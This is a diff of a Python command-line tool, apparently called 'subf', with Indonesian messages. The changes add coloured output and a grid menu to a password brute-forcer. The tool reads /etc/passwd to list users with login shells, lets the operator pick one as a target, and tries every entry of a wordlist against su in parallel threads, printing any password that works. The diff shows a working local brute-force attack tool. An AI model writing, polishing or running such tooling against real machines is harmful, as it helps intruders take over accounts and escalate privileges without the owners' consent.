@@ -4,6 +4,14 @@ import argparse
 import sys
 import os
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from itertools import zip_longest
+
+# Warna ANSI
+RESET = "\033[0m"
+RED = "\033[91m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+CYAN = "\033[96m"
 
 def try_password(user, password):
     try:
@@ -18,17 +26,16 @@ def try_password(user, password):
         child.close()
         return (False, password, None)
     except Exception as e:
-        return (False, password, f"Error: {str(e)}")
+        return (False, password, f"{RED}Error: {str(e)}{RESET}")
 
 def print_header(tool_name, version, description):
-    width = 50
-    print("┌" + "─" * width + "┐")
-    print(f"│ {tool_name} - v{version}")
-    print(f"│ {description}")
-    print("└" + "─" * width + "┘\n")
+    width = 60
+    print(CYAN + "┌" + "─" * width + "┐")
+    print(f"│ {tool_name} - v{version}".ljust(width + 1) + "│")
+    print(f"│ {description}".ljust(width + 1) + "│")
+    print("└" + "─" * width + "┘" + RESET + "\n")
 
 def get_login_users():
-    """Ambil daftar user yang shell-nya bisa login (bukan nologin/false) dari /etc/passwd"""
     valid_shells = {
         '/bin/bash', '/bin/sh', '/bin/zsh', '/bin/dash', '/bin/ksh',
         '/usr/bin/bash', '/usr/bin/zsh', '/usr/bin/sh', '/usr/local/bin/bash'
@@ -38,26 +45,33 @@ def get_login_users():
         with open("/etc/passwd", "r") as f:
             for line in f:
                 parts = line.strip().split(":")
-                if len(parts) < 7:
-                    continue
-                username, shell = parts[0], parts[6]
-                if shell in valid_shells:
-                    users.append(username)
+                if len(parts) >= 7 and parts[6] in valid_shells:
+                    users.append(parts[0])
     except Exception as e:
-        print(f"[ERROR] Gagal baca /etc/passwd: {e}")
+        print(f"{RED}[ERROR]{RESET} Gagal baca /etc/passwd: {e}")
     return users
 
 def choose_user(users):
-    print("Pilih user target dari daftar berikut:")
-    for i, u in enumerate(users, 1):
-        print(f"  [{i}] {u}")
+    print(YELLOW + "Pilih user target dari daftar berikut:" + RESET)
+    cols = 3
+    rows = (len(users) + cols - 1) // cols
+    grid = [users[i::rows] for i in range(rows)]  # Buat kolom dari baris
+
+    # Transpose & isi kosong agar rata
+    grid = list(zip_longest(*grid, fillvalue=""))
+    for row in grid:
+        line = ""
+        for i, user in enumerate(row):
+            if user:
+                idx = users.index(user) + 1
+                line += f"[{idx:2}] {user:<15} "
+        print("  " + line)
+
     while True:
         choice = input(f"Masukkan nomor user (1-{len(users)}): ").strip()
-        if choice.isdigit():
-            idx = int(choice)
-            if 1 <= idx <= len(users):
-                return users[idx-1]
-        print("Input tidak valid. Coba lagi.")
+        if choice.isdigit() and 1 <= int(choice) <= len(users):
+            return users[int(choice)-1]
+        print(RED + "Input tidak valid. Coba lagi." + RESET)
 
 def main():
     parser = argparse.ArgumentParser(description="subf: fast su brute-force with elegant UI")
@@ -67,48 +81,44 @@ def main():
     args = parser.parse_args()
 
     if not os.path.isfile(args.wordlist):
-        print(f"[ERROR] Wordlist tidak ditemukan: {args.wordlist}")
+        print(f"{RED}[ERROR]{RESET} Wordlist tidak ditemukan: {args.wordlist}")
         sys.exit(1)
 
-    if args.user:
-        user = args.user
-    else:
-        users = get_login_users()
-        if not users:
-            print("[ERROR] Tidak ditemukan user yang valid di /etc/passwd")
-            sys.exit(1)
-        user = choose_user(users)
+    user = args.user or choose_user(get_login_users() or [])
+    if not user:
+        print(f"{RED}[ERROR]{RESET} Tidak ditemukan user yang valid.")
+        sys.exit(1)
 
     with open(args.wordlist, "r") as f:
         passwords = [line.strip() for line in f if line.strip()]
 
     print_header("Subf", "1.0", "Unlock & Brute-Force User Access Tool")
-    print(f"[INFO] Target user   : {user}")
-    print(f"[INFO] Total password: {len(passwords)}")
-    print(f"[INFO] Threads      : {args.threads}")
-    print("[INFO] Mulai proses brute-force...\n")
+    print(f"{YELLOW}[INFO]{RESET} Target user   : {user}")
+    print(f"{YELLOW}[INFO]{RESET} Total password: {len(passwords)}")
+    print(f"{YELLOW}[INFO]{RESET} Threads       : {args.threads}")
+    print(f"{YELLOW}[INFO]{RESET} Mulai proses brute-force...\n")
 
     found = False
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        future_to_pwd = {executor.submit(try_password, user, pwd): pwd for pwd in passwords}
-        for i, future in enumerate(as_completed(future_to_pwd), 1):
+        futures = {executor.submit(try_password, user, pwd): pwd for pwd in passwords}
+        for i, future in enumerate(as_completed(futures), 1):
             success, pwd, result = future.result()
-            print(f"[{i:>4}/{len(passwords)}] Mencoba password: {pwd}     ", end="\r")
+            print(f"\r{CYAN}[{i:>4}/{len(passwords)}]{RESET} Mencoba password: {pwd:<30}", end="")
             if success:
-                print("\n" + "-"*60)
+                print("\n" + GREEN + "─" * 60)
                 print(f"[SUCCESS] Password ditemukan untuk user '{user}': {pwd}")
                 print(f"[RESULT]  {result}")
-                print("-"*60)
+                print("─" * 60 + RESET)
                 found = True
                 break
 
     if not found:
-        print("\n" + "-"*60)
+        print("\n" + RED + "─" * 60)
         print("[FAILED] Tidak berhasil menemukan password.")
-        print("-"*60)
+        print("─" * 60 + RESET)
 
 if __name__ == "__main__":
     if sys.stdin.isatty():
         main()
     else:
-        print("[-] Jalankan script ini di terminal (TTY).")
+        print(f"{RED}[-]{RESET} Jalankan script ini di terminal (TTY).")
